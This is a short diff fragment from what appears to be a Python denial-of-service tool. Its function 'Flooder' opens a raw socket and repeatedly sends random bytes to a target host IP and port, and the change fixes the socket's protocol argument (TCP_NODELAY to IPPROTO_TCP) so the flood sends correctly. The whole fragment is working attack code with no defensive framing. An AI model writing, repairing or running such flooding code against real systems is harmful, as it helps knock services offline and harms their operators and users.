@@ -51,7 +51,7 @@ def FormatCheck():
 '''
 def Flooder(**pHu):
     global count
-    sVar = socket.socket(socket.AF_INET,socket.SOCK_RAW,socket.TCP_NODELAY)
+    sVar = socket.socket(socket.AF_INET,socket.SOCK_RAW,socket.IPPROTO_TCP)
     try:
         z3Payload = randbytes(bytesX)
         sendByte = sVar.sendto(z3Payload, (pHu['host_ip'],pHu['port']))
